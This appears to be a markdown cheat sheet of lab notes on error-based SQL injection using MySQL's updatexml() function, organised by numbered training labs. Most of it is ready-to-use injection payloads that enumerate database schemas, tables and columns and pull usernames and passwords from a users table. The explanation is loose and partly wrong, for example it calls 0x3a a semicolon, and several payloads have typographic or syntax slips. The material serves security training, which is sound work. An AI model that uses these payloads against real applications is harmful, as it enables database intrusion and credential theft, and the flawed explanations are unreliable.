# Double query injections
## UpdateXML(xml_target, xpath_expr, new_xml);
XML is a markup language much like HTML.XML was designed to store and transport data <br>
updatexml is a sql query which is used to update a xml form in which to update a particaular XPath Expression <br>
to a new one.their are valid and invalid characters in xml path language.when we insert a invalid character with our <br>
sql query our playload in x_path expression. so it gets evaluted and stored in form of error. in this we concat 0x3a(;) <br>
which is a invalid xpath expression. so our error message is a evaluted sql query<br>
basic syntax we can even use extractvalue same like updatexml<br>
updatexml(<‘a>aa</a>’ , ’/a’ ,null);<br>

Select  updatexml(<‘a>aa</a>’ , ’/a’ ,null);<br>
  
AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)-<br>
in this we dont need to concat ; coz version itself have special characters in them so it itself produces error

AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--<br>
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--<br>

we concat : in the a first because the table name wont have any invalid chars as it is only letters so to retrive the first name we concat ';' <br>
but from them ',' is a invalid char so it validates the whole expression. and there is the limit for this error string.<br>


AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--<br>
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--<br>
Lab 5<br>
1’ AND updatexml(rand(),concat(0x3a,(SELECT concat(group_concat(column_name)) FROM information_schema.columns WHERE TABLE_NAME='emails' LIMIT 0,1)),null)--+<br>
1’ AND updatexml(rand(),concat(0x3a,(SELECT concat(group_concat(table_name)) FROM information_schema.tables WHERE TABLE_schema=database() LIMIT 0,1)),null)--+<br>
1’ AND updatexml(rand(),concat(0x3a,(SELECT concat(group_concat(username)) FROM users LIMIT 0,1)),null)—+  <br>
1’ AND updatexml(rand(),concat(0x3a,(SELECT concat(group_concat(password)) FROM users LIMIT 0,1)),null)—+ <br>

Lab 6<br>
1" AND updatexml(rand(),concat(0x3a,(SELECT concat(group_concat(column_name)) FROM information_schema.columns WHERE TABLE_NAME='emails' LIMIT 0,1)),null)-- <br>
1" AND updatexml(rand(),concat(0x3a,(SELECT concat(group_concat(table_name)) FROM information_schema.tables WHERE TABLE_schema=database() LIMIT 0,1)),null)--+ <br>
1" AND updatexml(rand(),concat(0x3a,(SELECT group_concat(username)) FROM users LIMIT 0,1)),null)--+<br>
1" AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),group_concat(password),CHAR(126)) FROM users LIMIT 0,1)),null)—+  <br>

Lab 13 <br>
1’) AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),group_concat(column_name),CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME='emails' LIMIT 0,1)),null)—+ <br>
1’) AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),group_concat(table_name),CHAR(126)) FROM information_schema.tables WHERE TABLE_schema=database() LIMIT 0,1)),null)—+ <br>
1’) AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),group_concat(username),CHAR(126)) FROM users LIMIT 0,1)),null)—+  <br>
1’) AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),group_concat(password),CHAR(126)) FROM users LIMIT 0,1)),null)—+ <br>


Lab 14<br>
1" AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),group_concat(column_name),CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME='emails' LIMIT 0,1)),null)—+ <br>
1" AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),group_concat(table_name),CHAR(126)) FROM information_schema.tables WHERE TABLE_schema=database() LIMIT 0,1)),null)—+<br>
1" AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),group_concat(username),CHAR(126)) FROM users LIMIT 0,1)),null)--+ <br>
1" AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),group_concat(password),CHAR(126)) FROM users LIMIT 0,1)),null)—+  <br>





